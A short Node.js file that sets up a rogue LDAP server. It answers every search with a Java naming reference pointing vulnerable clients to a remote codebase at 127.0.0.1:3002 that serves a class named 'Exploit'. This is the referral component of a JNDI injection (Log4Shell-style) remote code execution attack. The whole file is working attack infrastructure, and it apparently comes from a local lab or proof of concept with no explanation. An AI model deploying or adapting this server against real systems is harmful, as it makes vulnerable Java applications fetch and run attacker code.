const ldap = require('ldapjs');

const server = ldap.createServer();

server.search('', (request, response) => {
    console.log("Performing lookup")
    response.send({
        dn: request.dn.toString(),
        attributes: {
            objectClass: ['javaNamingReference'],
            javaClassName: ['Exploit'],
            javaFactory: ['Exploit'],
            javaCodebase: ['http://127.0.0.1:3002/']
        }
    })
    response.end();
})

server.listen(3001, '127.0.0.1', () => {
    console.log('LDAP Server listening at %s', server.url);
})